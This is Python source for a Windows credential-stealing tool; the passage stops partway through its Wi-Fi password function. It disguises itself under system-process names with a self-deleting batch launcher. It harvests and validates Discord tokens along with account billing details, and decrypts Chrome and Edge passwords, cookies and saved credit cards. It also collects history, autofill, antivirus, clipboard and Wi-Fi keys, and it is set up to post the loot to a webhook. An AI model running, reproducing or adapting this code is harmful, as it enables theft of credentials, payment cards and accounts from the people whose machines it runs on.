import os
import shutil
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import re
import requests
import platform
import socket
import uuid
import subprocess
from datetime import datetime, timezone, timedelta
import winreg
import psutil
import random
import string
import sys
import tempfile

run_on_startup = True
silent = True
delete_file = True

class StealthManager:
    def __init__(self):
        self.hidden_name = self.generate_stealth_name()
        
    def generate_stealth_name(self):
        system_names = [
            "WindowsDefender", "System32", "RuntimeBroker", "svchost", 
            "dllhost", "taskhostw", "csrss", "winlogon", "services"
        ]
        extensions = [".exe", ".dll", ".sys", ".dat", ".tmp"]
        return random.choice(system_names) + random.choice(extensions)
    
    def hide_in_system(self):
        try:
            current_file = os.path.abspath(__file__)
            temp_dir = tempfile.gettempdir()
            stealth_path = os.path.join(temp_dir, self.hidden_name)
            
            if not os.path.exists(stealth_path):
                shutil.copy2(current_file, stealth_path)
                
            bat_content = f'''
@echo off
python "{stealth_path}"
del "%~f0"
'''
            bat_path = os.path.join(tempfile.gettempdir(), "windows_update.bat")
            with open(bat_path, 'w') as f:
                f.write(bat_content)
                
            return stealth_path
        except Exception as e:
            return None

class DiscordTokenGrabber:
    def __init__(self, silent_mode=False):
        self.silent = silent_mode
        self.tokens = []
        
    def log(self, message):
        if not self.silent:
            print(message)

    def get_discord_paths(self):
        paths = []
        roaming = os.getenv('APPDATA')
        local = os.getenv('LOCALAPPDATA')
        
        discord_clients = [
            os.path.join(roaming, 'Discord'),
            os.path.join(roaming, 'discordcanary'), 
            os.path.join(roaming, 'discordptb'),
            os.path.join(roaming, 'discorddevelopment'),
            os.path.join(local, 'Discord'),
            os.path.join(local, 'discordcanary'),
            os.path.join(local, 'discordptb'),
            os.path.join(local, 'discorddevelopment')
        ]
        
        return [path for path in discord_clients if os.path.exists(path)]

    def extract_tokens_from_leveldb(self, path):
        tokens = []
        leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
        
        if not os.path.exists(leveldb_path):
            return tokens
            
        for file in os.listdir(leveldb_path):
            if file.endswith('.ldb') or file.endswith('.log'):
                try:
                    with open(os.path.join(leveldb_path, file), 'r', errors='ignore') as f:
                        content = f.read()
                        patterns = [
                            r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}',
                            r'mfa\.[a-zA-Z0-9_-]{84}',
                            r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{38}'
                        ]
                        
                        for pattern in patterns:
                            found = re.findall(pattern, content)
                            tokens.extend(found)
                except:
                    continue
                    
        return tokens

    def get_browser_discord_tokens(self):
        browsers = {
            'Chrome': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
            'Brave': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data')
        }
        
        tokens = []
        for browser, path in browsers.items():
            if os.path.exists(path):
                for profile in ['Default', 'Profile 1', 'Profile 2', 'Profile 3']:
                    profile_path = os.path.join(path, profile)
                    if os.path.exists(profile_path):
                        tokens.extend(self.extract_tokens_from_leveldb(profile_path))
                            
        return tokens

    def verify_token(self, token):
        try:
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }
            
            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
            if response.status_code == 200:
                user_data = response.json()
                return {
                    'valid': True,
                    'token': token,
                    'username': f"{user_data.get('username', '')}#{user_data.get('discriminator', '')}",
                    'id': user_data.get('id', ''),
                    'email': user_data.get('email', ''),
                    'phone': user_data.get('phone', ''),
                    'verified': user_data.get('verified', False)
                }
        except:
            pass
            
        return {'valid': False, 'token': token}

    def get_detailed_discord_info(self, token):
        try:
            headers = {'Authorization': token}
            
            user_req = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
            if user_req.status_code != 200:
                return None
                
            user_data = user_req.json()
            
            guilds_req = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers, timeout=10)
            guilds = guilds_req.json() if guilds_req.status_code == 200 else []
            
            friends_req = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers, timeout=10)
            friends = friends_req.json() if friends_req.status_code == 200 else []
            
            nitro_req = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=10)
            has_nitro = nitro_req.status_code == 200 and len(nitro_req.json()) > 0
            
            payment_req = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers, timeout=10)
            payment_methods = payment_req.json() if payment_req.status_code == 200 else []
            
            return {
                'token': token,
                'user': user_data,
                'guilds_count': len(guilds),
                'guilds': [{'id': g['id'], 'name': g['name']} for g in guilds[:10]],
                'friends_count': len(friends),
                'has_nitro': has_nitro,
                'payment_methods_count': len(payment_methods),
                'premium_type': user_data.get('premium_type', 0)
            }
            
        except Exception as e:
            self.log(f"Detailed Discord info error: {e}")
            return None

    def grab_all_discord_tokens(self):
        all_tokens = []
        
        self.log("Starting Discord token extraction...")
        
        discord_paths = self.get_discord_paths()
        for path in discord_paths:
            self.log(f"Checking Discord path: {path}")
            tokens = self.extract_tokens_from_leveldb(path)
            all_tokens.extend(tokens)
            
        browser_tokens = self.get_browser_discord_tokens()
        all_tokens.extend(browser_tokens)
        
        unique_tokens = list(set(all_tokens))
        self.log(f"Found {len(unique_tokens)} unique tokens before verification")
        
        valid_tokens = []
        for token in unique_tokens:
            verified = self.verify_token(token)
            if verified['valid']:
                detailed_info = self.get_detailed_discord_info(token)
                if detailed_info:
                    valid_tokens.append(detailed_info)
                    self.log(f"Valid token found: {verified['username']}")
                    
        self.log(f"Extracted {len(valid_tokens)} valid Discord tokens")
        return valid_tokens

class Chrome:
    def __init__(self, silent_mode=False):
        self.silent = silent_mode

    def log(self, message):
        if not self.silent:
            print(message)

    def get_chrome_db_path(self):
        path = os.path.join(
            os.environ['USERPROFILE'], 'AppData', 'Local',
            'Google', 'Chrome', 'User Data', 'Default', 'Login Data'
        )
        return path
    
    def get_encryption_key(self):
        local_state_path = os.path.join(
            os.environ['USERPROFILE'], 'AppData', 'Local',
            'Google', 'Chrome', 'User Data', 'Local State'
        )
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
    def decrypt_password(self, buff, key):
        if not buff:
            return ""
        try:
            if buff[:3] == b'v10':
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                decrypted = cipher.decrypt(payload)[:-16].decode('utf-8')
                return decrypted
            else:
                return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except Exception:
            return ""

    def extract_passwords(self):
        temp_db_path = None
        try:
            db_path = self.get_chrome_db_path()
            temp_db_path = "ChromeData.db"
            shutil.copyfile(db_path, temp_db_path)
            db = sqlite3.connect(temp_db_path)
            cursor = db.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            key = self.get_encryption_key()
            results = []
            for row in cursor.fetchall():
                url, username, encrypted = row
                password = self.decrypt_password(encrypted, key)
                if username or password:
                    results.append({
                        "url": url,
                        "username": username,
                        "password": password
                    })
            cursor.close()
            db.close()
            self.log(f"Extracted {len(results)} Chrome passwords")
            return results
        except Exception as e:
            self.log(f"Chrome password extraction error: {e}")
            return []
        finally:
            if temp_db_path and os.path.exists(temp_db_path):
                try:
                    os.remove(temp_db_path)
                except:
                    pass
    
    def get_browser_cookies(self):
        browser_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                   'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
        cookies_data = []
        temp_path = None
        
        if not os.path.exists(browser_path):
            return cookies_data
        
        try:
            temp_path = "Cookies_temp.db"
            shutil.copyfile(browser_path, temp_path)
            
            local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                           'Google', 'Chrome', 'User Data', 'Local State')
            key = None
            if os.path.exists(local_state_path):
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure FROM cookies")
            
            for host_key, name, value, encrypted_value, path, expires_utc, is_secure in cursor.fetchall():
                decrypted_value = value
                if encrypted_value and key:
                    try:
                        if encrypted_value[:3] == b'v10':
                            iv = encrypted_value[3:15]
                            payload = encrypted_value[15:]
                            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                            decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8')
                        else:
                            decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                    except:
                        pass
                
                cookies_data.append({
                    'domain': host_key,
                    'name': name,
                    'value': decrypted_value,
                    'path': path,
                    'secure': bool(is_secure)
                })
            
            cursor.close()
            conn.close()
            self.log(f"Extracted {len(cookies_data)} Chrome cookies")
            
        except Exception as e:
            self.log(f"Chrome cookie extraction error: {e}")
        finally:
            if temp_path and os.path.exists(temp_path):
                try:
                    os.remove(temp_path)
                except:
                    pass
        
        return cookies_data

    def get_chrome_history(self):
        history_data = []
        temp_history_path = None
        
        history_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                   'Google', 'Chrome', 'User Data', 'Default', 'History')
        
        if not os.path.exists(history_path):
            return history_data
        
        try:
            temp_history_path = "History.db"
            shutil.copyfile(history_path, temp_history_path)
            
            conn = sqlite3.connect(temp_history_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_time 
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT 1000
            """)
            
            for url, title, visit_count, last_visit_time in cursor.fetchall():
                visit_date = datetime(1601, 1, 1) + timedelta(microseconds=last_visit_time)
                visit_str = visit_date.strftime('%Y-%m-%d %H:%M:%S')
                
                history_data.append({
                    'url': url,
                    'title': title,
                    'visit_count': visit_count,
                    'last_visit': visit_str
                })
            
            cursor.close()
            conn.close()
            self.log(f"Extracted {len(history_data)} Chrome history entries")
            
        except Exception as e:
            self.log(f"Chrome history extraction error: {e}")
        finally:
            if temp_history_path and os.path.exists(temp_history_path):
                try:
                    os.remove(temp_history_path)
                except:
                    pass
        
        return history_data

    def get_credit_cards(self):
        cards_data = []
        temp_db_path = None
        
        try:
            cards_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                     'Google', 'Chrome', 'User Data', 'Default', 'Web Data')
            
            if not os.path.exists(cards_path):
                return cards_data
            
            temp_db_path = "WebData_cards.db"
            shutil.copyfile(cards_path, temp_db_path)
            
            key = self.get_encryption_key()
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT name_on_card, expiration_month, expiration_year, 
                       card_number_encrypted, date_modified 
                FROM credit_cards
            """)
            
            for name, exp_month, exp_year, encrypted_card, date_modified in cursor.fetchall():
                decrypted_card = "DECRYPT_FAILED"
                
                if encrypted_card and key:
                    try:
                        if encrypted_card[:3] == b'v10':
                            iv = encrypted_card[3:15]
                            payload = encrypted_card[15:]
                            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                            decrypted_card = cipher.decrypt(payload)[:-16].decode('utf-8')
                        else:
                            decrypted_card = win32crypt.CryptUnprotectData(encrypted_card, None, None, None, 0)[1].decode()
                    except:
                        pass
                
                mod_date = datetime(1601, 1, 1) + timedelta(microseconds=date_modified) if date_modified else None
                
                cards_data.append({
                    'name': name,
                    'card_number': decrypted_card,
                    'expiry': f"{exp_month}/{exp_year}",
                    'last_modified': mod_date.strftime('%Y-%m-%d %H:%M:%S') if mod_date else "Unknown"
                })
            
            cursor.close()
            conn.close()
            self.log(f"Extracted {len(cards_data)} Chrome credit cards")
            
        except Exception as e:
            self.log(f"Chrome credit card extraction error: {e}")
        finally:
            if temp_db_path and os.path.exists(temp_db_path):
                try:
                    os.remove(temp_db_path)
                except:
                    pass
        
        return cards_data

    def get_autofill_data(self):
        autofill_data = []
        temp_db_path = None
        
        try:
            autofill_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                        'Google', 'Chrome', 'User Data', 'Default', 'Web Data')
            
            if not os.path.exists(autofill_path):
                return autofill_data
            
            temp_db_path = "WebData_autofill.db"
            shutil.copyfile(autofill_path, temp_db_path)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT name, value, date_created, date_last_used FROM autofill")
            
            for name, value, created, last_used in cursor.fetchall():
                created_date = datetime(1601, 1, 1) + timedelta(microseconds=created) if created else None
                used_date = datetime(1601, 1, 1) + timedelta(microseconds=last_used) if last_used else None
                
                autofill_data.append({
                    'field': name,
                    'value': value,
                    'first_saved': created_date.strftime('%Y-%m-%d %H:%M:%S') if created_date else "Unknown",
                    'last_used': used_date.strftime('%Y-%m-%d %H:%M:%S') if used_date else "Never"
                })
            
            cursor.close()
            conn.close()
            self.log(f"Extracted {len(autofill_data)} Chrome autofill entries")
            
        except Exception as e:
            self.log(f"Chrome autofill extraction error: {e}")
        finally:
            if temp_db_path and os.path.exists(temp_db_path):
                try:
                    os.remove(temp_db_path)
                except:
                    pass
        
        return autofill_data
        
    def main(self):
        passwords = self.extract_passwords()
        cookies = self.get_browser_cookies()
        history = self.get_chrome_history()
        cards = self.get_credit_cards()
        autofill = self.get_autofill_data()

        return {
            'passwords': passwords,
            'cookies': cookies,
            'history': history,
            'credit_cards': cards,
            'autofill': autofill
        }

class Edge:
    def __init__(self, silent_mode=False):
        self.silent = silent_mode

    def log(self, message):
        if not self.silent:
            print(message)

    def get_edge_db_path(self):
        path = os.path.join(
            os.environ['USERPROFILE'], 'AppData', 'Local',
            'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'
        )
        return path
    
    def get_encryption_key(self):
        local_state_path = os.path.join(
            os.environ['USERPROFILE'], 'AppData', 'Local',
            'Microsoft', 'Edge', 'User Data', 'Local State'
        )
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
    def decrypt_password(self, buff, key):
        if not buff:
            return ""
        try:
            if buff[:3] == b'v10':
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                decrypted = cipher.decrypt(payload)[:-16].decode('utf-8')
                return decrypted
            else:
                return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except Exception:
            return ""

    def extract_passwords(self):
        temp_db_path = None
        try:
            db_path = self.get_edge_db_path()
            temp_db_path = "EdgeData.db"
            shutil.copyfile(db_path, temp_db_path)
            db = sqlite3.connect(temp_db_path)
            cursor = db.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            key = self.get_encryption_key()
            results = []
            for row in cursor.fetchall():
                url, username, encrypted = row
                password = self.decrypt_password(encrypted, key)
                if username or password:
                    results.append({
                        "url": url,
                        "username": username,
                        "password": password
                    })
            cursor.close()
            db.close()
            self.log(f"Extracted {len(results)} Edge passwords")
            return results
        except Exception as e:
            self.log(f"Edge password extraction error: {e}")
            return []
        finally:
            if temp_db_path and os.path.exists(temp_db_path):
                try:
                    os.remove(temp_db_path)
                except:
                    pass

    def get_edge_cookies(self):
        cookies_data = []
        temp_path = None
        
        cookies_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                   'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies')
        
        if not os.path.exists(cookies_path):
            return cookies_data
        
        try:
            temp_path = "EdgeCookies.db"
            shutil.copyfile(cookies_path, temp_path)
            
            local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                           'Microsoft', 'Edge', 'User Data', 'Local State')
            key = None
            if os.path.exists(local_state_path):
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure FROM cookies")
            
            for host_key, name, value, encrypted_value, path, expires_utc, is_secure in cursor.fetchall():
                decrypted_value = value
                if encrypted_value and key:
                    try:
                        if encrypted_value[:3] == b'v10':
                            iv = encrypted_value[3:15]
                            payload = encrypted_value[15:]
                            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                            decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8')
                        else:
                            decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                    except:
                        pass
                
                cookies_data.append({
                    'domain': host_key,
                    'name': name,
                    'value': decrypted_value,
                    'path': path,
                    'secure': bool(is_secure)
                })
            
            cursor.close()
            conn.close()
            self.log(f"Extracted {len(cookies_data)} Edge cookies")
            
        except Exception as e:
            self.log(f"Edge cookie extraction error: {e}")
        finally:
            if temp_path and os.path.exists(temp_path):
                try:
                    os.remove(temp_path)
                except:
                    pass
        
        return cookies_data

    def get_edge_history(self):
        history_data = []
        temp_history_path = None
        
        history_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                   'Microsoft', 'Edge', 'User Data', 'Default', 'History')
        
        if not os.path.exists(history_path):
            return history_data
        
        try:
            temp_history_path = "EdgeHistory.db"
            shutil.copyfile(history_path, temp_history_path)
            
            conn = sqlite3.connect(temp_history_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_time 
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT 1000
            """)
            
            for url, title, visit_count, last_visit_time in cursor.fetchall():
                visit_date = datetime(1601, 1, 1) + timedelta(microseconds=last_visit_time)
                visit_str = visit_date.strftime('%Y-%m-%d %H:%M:%S')
                
                history_data.append({
                    'url': url,
                    'title': title,
                    'visit_count': visit_count,
                    'last_visit': visit_str
                })
            
            cursor.close()
            conn.close()
            self.log(f"Extracted {len(history_data)} Edge history entries")
            
        except Exception as e:
            self.log(f"Edge history extraction error: {e}")
        finally:
            if temp_history_path and os.path.exists(temp_history_path):
                try:
                    os.remove(temp_history_path)
                except:
                    pass
        
        return history_data

    def get_edge_credit_cards(self):
        cards_data = []
        temp_db_path = None
        
        try:
            cards_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                     'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')
            
            if not os.path.exists(cards_path):
                return cards_data
            
            temp_db_path = "EdgeWebData.db"
            shutil.copyfile(cards_path, temp_db_path)
            
            key = self.get_encryption_key()
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT name_on_card, expiration_month, expiration_year, 
                       card_number_encrypted, date_modified 
                FROM credit_cards
            """)
            
            for name, exp_month, exp_year, encrypted_card, date_modified in cursor.fetchall():
                decrypted_card = "DECRYPT_FAILED"
                
                if encrypted_card and key:
                    try:
                        if encrypted_card[:3] == b'v10':
                            iv = encrypted_card[3:15]
                            payload = encrypted_card[15:]
                            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                            decrypted_card = cipher.decrypt(payload)[:-16].decode('utf-8')
                        else:
                            decrypted_card = win32crypt.CryptUnprotectData(encrypted_card, None, None, None, 0)[1].decode()
                    except:
                        pass
                
                mod_date = datetime(1601, 1, 1) + timedelta(microseconds=date_modified) if date_modified else None
                
                cards_data.append({
                    'name': name,
                    'card_number': decrypted_card,
                    'expiry': f"{exp_month}/{exp_year}",
                    'last_modified': mod_date.strftime('%Y-%m-%d %H:%M:%S') if mod_date else "Unknown"
                })
            
            cursor.close()
            conn.close()
            self.log(f"Extracted {len(cards_data)} Edge credit cards")
            
        except Exception as e:
            self.log(f"Edge credit card extraction error: {e}")
        finally:
            if temp_db_path and os.path.exists(temp_db_path):
                try:
                    os.remove(temp_db_path)
                except:
                    pass
        
        return cards_data

    def get_edge_autofill(self):
        autofill_data = []
        temp_db_path = None
        
        try:
            autofill_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                        'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')
            
            if not os.path.exists(autofill_path):
                return autofill_data
            
            temp_db_path = "EdgeAutofill.db"
            shutil.copyfile(autofill_path, temp_db_path)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT name, value, date_created, date_last_used FROM autofill")
            
            for name, value, created, last_used in cursor.fetchall():
                created_date = datetime(1601, 1, 1) + timedelta(microseconds=created) if created else None
                used_date = datetime(1601, 1, 1) + timedelta(microseconds=last_used) if last_used else None
                
                autofill_data.append({
                    'field': name,
                    'value': value,
                    'first_saved': created_date.strftime('%Y-%m-%d %H:%M:%S') if created_date else "Unknown",
                    'last_used': used_date.strftime('%Y-%m-%d %H:%M:%S') if used_date else "Never"
                })
            
            cursor.close()
            conn.close()
            self.log(f"Extracted {len(autofill_data)} Edge autofill entries")
            
        except Exception as e:
            self.log(f"Edge autofill extraction error: {e}")
        finally:
            if temp_db_path and os.path.exists(temp_db_path):
                try:
                    os.remove(temp_db_path)
                except:
                    pass
        
        return autofill_data

    def get_edge_downloads(self):
        downloads_data = []
        temp_db_path = None
        
        try:
            history_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                       'Microsoft', 'Edge', 'User Data', 'Default', 'History')
            
            if not os.path.exists(history_path):
                return downloads_data
            
            temp_db_path = "EdgeDownloads.db"
            shutil.copyfile(history_path, temp_db_path)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT target_path, tab_url, start_time, received_bytes, total_bytes 
                FROM downloads 
                ORDER BY start_time DESC 
                LIMIT 100
            """)
            
            for target_path, tab_url, start_time, received_bytes, total_bytes in cursor.fetchall():
                start_date = datetime(1601, 1, 1) + timedelta(microseconds=start_time) if start_time else None
                
                downloads_data.append({
                    'file': target_path,
                    'url': tab_url,
                    'download_time': start_date.strftime('%Y-%m-%d %H:%M:%S') if start_date else "Unknown",
                    'size': f"{received_bytes}/{total_bytes} bytes"
                })
            
            cursor.close()
            conn.close()
            self.log(f"Extracted {len(downloads_data)} Edge download entries")
            
        except Exception as e:
            self.log(f"Edge downloads extraction error: {e}")
        finally:
            if temp_db_path and os.path.exists(temp_db_path):
                try:
                    os.remove(temp_db_path)
                except:
                    pass
        
        return downloads_data

    def main(self):
        passwords = self.extract_passwords()
        cookies = self.get_edge_cookies()
        history = self.get_edge_history()
        cards = self.get_edge_credit_cards()
        autofill = self.get_edge_autofill()
        downloads = self.get_edge_downloads()

        return {
            'passwords': passwords,
            'cookies': cookies,
            'history': history,
            'credit_cards': cards,
            'autofill': autofill,
            'downloads': downloads
        }

class SystemInfo:
    def __init__(self, silent_mode=False):
        self.silent = silent_mode

    def log(self, message):
        if not self.silent:
            print(message)

    def get_antivirus_info(self):
        av_list = []
        try:
            av_processes = {
                'Windows Defender': 'MsMpEng.exe',
                'Avast': 'AvastSvc.exe', 
                'AVG': 'AVGSvc.exe',
                'Bitdefender': 'bdagent.exe',
                'Kaspersky': 'avp.exe',
                'Norton': 'NortonSecurity.exe',
                'McAfee': 'McAfee.exe',
                'Malwarebytes': 'MBAMService.exe'
            }
            
            for process in psutil.process_iter(['name']):
                for av_name, proc_name in av_processes.items():
                    if process.info['name'] and proc_name.lower() in process.info['name'].lower():
                        av_list.append(av_name)
                        
        except Exception as e:
            self.log(f"AV detection error: {e}")
            
        return list(set(av_list))

    def get_network_info(self):
        network_info = {}
        try:
            interfaces = []
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        interfaces.append({
                            'interface': interface,
                            'ip': addr.address,
                            'netmask': addr.netmask
                        })
            
            network_info['interfaces'] = interfaces
            
            net_io = psutil.net_io_counters()
            network_info['stats'] = {
                'bytes_sent': net_io.bytes_sent,
                'bytes_recv': net_io.bytes_recv,
                'packets_sent': net_io.packets_sent,
                'packets_recv': net_io.packets_recv
            }
            
        except Exception as e:
            self.log(f"Network info error: {e}")
            
        return network_info

    def get_hardware_info(self):
        hardware = {}
        try:
            hardware['cpu'] = {
                'cores': psutil.cpu_count(logical=False),
                'logical_cores': psutil.cpu_count(logical=True),
                'usage': psutil.cpu_percent(interval=1),
                'frequency': psutil.cpu_freq().current if psutil.cpu_freq() else 'Unknown'
            }
            
            mem = psutil.virtual_memory()
            hardware['memory'] = {
                'total': mem.total,
                'available': mem.available,
                'used': mem.used,
                'percent': mem.percent
            }
            
            disks = []
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    disks.append({
                        'device': partition.device,
                        'mountpoint': partition.mountpoint,
                        'fstype': partition.fstype,
                        'total': usage.total,
                        'used': usage.used,
                        'free': usage.free,
                        'percent': usage.percent
                    })
                except:
                    continue
                    
            hardware['disks'] = disks
            
        except Exception as e:
            self.log(f"Hardware info error: {e}")
            
        return hardware

    def get_running_processes(self):
        processes = []
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
                try:
                    processes.append(proc.info)
                except:
                    continue
        except Exception as e:
            self.log(f"Process info error: {e}")
            
        return processes[:50] 

    def get_installed_software(self):
        software_list = []
        try:
            registry_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            
            for path in registry_paths:
                try:
                    key = winreg.HKEY_LOCAL_MACHINE
                    with winreg.OpenKey(key, path) as reg_key:
                        for i in range(winreg.QueryInfoKey(reg_key)[0]):
                            try:
                                software_name = winreg.EnumKey(reg_key, i)
                                with winreg.OpenKey(key, f"{path}\\{software_name}") as software_key:
                                    try:
                                        name = winreg.QueryValueEx(software_key, "DisplayName")[0]
                                        try:
                                            version = winreg.QueryValueEx(software_key, "DisplayVersion")[0]
                                        except:
                                            version = "Unknown"
                                        software_list.append({'name': name, 'version': version})
                                    except:
                                        pass
                            except:
                                pass
                except:
                    pass
                    
        except Exception as e:
            self.log(f"Software detection error: {e}")
            
        return software_list

    def get_system_info(self):
        try:
            software_list = self.get_installed_software()
            
            processes = self.get_running_processes()
            
            hardware = self.get_hardware_info()
            
            network = self.get_network_info()
            
            antivirus = self.get_antivirus_info()

            system_info = {
                'computer_name': os.getenv('COMPUTERNAME', 'unknown_pc'),
                'username': os.getenv('USERNAME', 'unknown_user'),
                'os': platform.system(),
                'os_version': platform.version(),
                'processor': platform.processor(),
                'hostname': socket.gethostname(),
                'mac_address': ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,8*6,8)][::-1]),
                'architecture': platform.architecture()[0],
                'platform': platform.platform(),
                'installed_software_count': len(software_list),
                'running_processes_count': len(processes),
                'current_directory': os.getcwd(),
                'system_drive': os.getenv('SystemDrive', 'Unknown'),
                'windows_directory': os.getenv('windir', 'Unknown'),
                'hardware': hardware,
                'network': network,
                'antivirus': antivirus,
                'installed_software_sample': software_list[:20],  
                'processes_sample': processes
            }
            
            self.log("Advanced system information collected")
            return system_info
        except Exception as e:
            self.log(f"System info error: {e}")
            return {}

class ClipboardGrabber:
    def __init__(self, silent_mode=False):
        self.silent = silent_mode

    def log(self, message):
        if not self.silent:
            print(message)

    def get_clipboard_content(self):
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            
            clipboard_data = None
            
            formats = {
                win32clipboard.CF_TEXT: 'text',
                win32clipboard.CF_UNICODETEXT: 'unicode',
                13: 'html',  
                2: 'bitmap'  
            }
            
            for format_id, format_name in formats.items():
                try:
                    if format_name == 'text':
                        data = win32clipboard.GetClipboardData(format_id)
                        if data:
                            clipboard_data = data.decode('latin-1')
                            break
                    elif format_name == 'unicode':
                        data = win32clipboard.GetClipboardData(format_id)
                        if data:
                            clipboard_data = data
                            break
                except:
                    continue
                    
            win32clipboard.CloseClipboard()
            
            if clipboard_data:
                self.log("Clipboard content extracted")
                return clipboard_data[:1000]  
                
        except Exception as e:
            self.log(f"Clipboard error: {e}")
            
        return None

class Grabber:
    def __init__(self, webhook_url, username: str = "", password: str = "", silent_mode=False):
        self.silent = silent_mode
        self.webhook_url = webhook_url
        self.username = username
        self.password = password

    def log(self, message):
        if not self.silent:
            print(message)

    def find_discord_tokens(self):
        grabber = DiscordTokenGrabber(silent_mode=self.silent)
        return grabber.grab_all_discord_tokens()

    def get_wifi_passwords(self):
        wifi_data = []
        
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                capture_output=True, text=True, encoding='utf-8')
            
            profiles = re.findall(r'All User Profile\s+:\s+(.*)', result.stdout)
            
            for profile in profiles:
                profile = profile.strip()
                if not profile:
                    continue
                    
                try:
                    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                                        capture_output=True, text=True, encoding='utf-8')
                    
                    password_match = re.search(r'Key Content\s+:\s+(.*)', result.stdout)
                    password = password_match.group(1).strip() if password_match else "No password"
                    
                    wifi_data.append({
                        'ssid': profile,
                        'password': password
                    })
                except:
                    wifi_data.append({
                        'ssid': profile,
                        'password': 'Error retrieving password'
                    })
                    
        except Exception as e:
            self.log(f"WiFi extraction error: {e}")
        
